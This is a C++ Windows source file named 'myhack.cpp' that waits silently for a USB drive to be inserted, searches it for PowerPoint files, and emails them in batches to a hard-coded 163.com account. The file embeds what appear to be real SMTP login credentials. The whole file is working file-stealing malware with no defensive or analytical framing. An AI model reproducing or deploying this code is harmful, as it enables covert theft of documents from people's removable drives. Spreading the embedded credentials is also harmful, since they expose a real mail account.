// myhack.cpp : Defines the entry point for the application.
//
#define _AFXDLL
#include <afx.h>
#include "smtp.h"
#include <iterator>
#include <string>
//#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>

bool getUDisk();
void MyFindFile(CString,CString);
vector<string> file;
char diskPath[5] = { 0 };


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	if(!getUDisk())
		return -1;
	CSmtp smtp(25,"smtp.163.com","13618688056@163.com","19981113qsgnep","13618688056@163.com",
			"��������","");

	//CSmtp smtpfilelist(25,"smtp.163.com","13618688056@163.com","19981113qsgnep","137764477@qq.com",
	//		"�ļ��б�"," ");
	//MyFindFile(diskPath,"ppt");
	MyFindFile(diskPath,"pptx");
	vector<string>::iterator it = file.begin();
	//	sprintf(str,"%d",file.size());
	//	MessageBox(NULL,str,"",MB_OK);
	int len10 = file.size()/10;
	for(int i = 0; i< len10; ++i)
	{
		for(int j = 0; j< 10 ; ++j,++it)
		{
			smtp.AddAttachment(*(it));
		}
		
		smtp.SendEmail_Ex();
		//MessageBox(NULL,"","",MB_OK);
		smtp.DeleteAllAttachment();
		Sleep(6000);
		//MessageBox(NULL,"","",MB_OK);
	}
	for(; it != file.end(); ++it)
	{
		//sprintf(str,"%s",(*it));
		//MessageBox(NULL,str,"",MB_OK);
		smtp.AddAttachment((*it));
		
	}
	
	int err = 0;
	if((err = smtp.SendEmail_Ex()) !=0 )
	{
		/*
		if (err == -1)    
            cout << "����-1: û��Ŀ�������ַ!" << endl;    
        if (err == 1)    
            cout << "����1: �������粻��ͨ������ʧ��!" << endl;    
        if (err == 2)    
            cout << "����2: �û�������,��˶�!" << endl;    
        if (err == 3)    
            cout << "����3: �û����������˶�!" << endl;    
        if (err == 4)    
            cout << "����4: ���鸽��Ŀ¼�Ƿ���ȷ���Լ��ļ��Ƿ����!" << endl;
			*/
		return -1;
	}
	return 0;
}

void MyFindFile(CString strPath,CString strType)
{
	CFileFind fd;
	CString strDir = strPath+"\\*.*";
	bool bRet = true;
	bRet = fd.FindFile(strDir,0);
	while(bRet)
	{
		//cout<<"hello"<<endl;
		bRet = fd.FindNextFile();
		if(fd.IsDots())
		{
			continue;
		}
		if(fd.IsDirectory())
		{
			MyFindFile(fd.GetFilePath(),strType);
		}else{
			CString str = fd.GetFilePath();
			if(str.Right(strType.GetLength()).Compare(strType)==0)
			{
				file.push_back((string)(str.GetBuffer(str.GetLength())));
			}
		}
	}
}

bool getUDisk()
{
	//Sleep(60000);
	while(true)
	{
		DWORD allDisk = GetLogicalDrives();
		if (allDisk!=0)
		{
			
			for (int i=0;i<24;i++)     //�ٶ������10������
			{
				if ((allDisk & 1)==1)
				{
					sprintf( diskPath, "%c", 'C'+i );
					strcat( diskPath, ":" );
					
					if ( GetDriveType(diskPath)==DRIVE_REMOVABLE )
					{
						//AfxMessageBox( "��⵽U��", MB_OK );
						//AfxMessageBox( diskPath, MB_OK );
						
						if( GetVolumeInformation(diskPath,0,0,0,0,0,0,0) ) //�ж������Ƿ�׼������
						{
							//printf("U��׼������!");
							
							return true;
						}
					}
				}
				
				allDisk = allDisk>>1;
			}	
		}
		Sleep(6000);
	}
	return false;
}

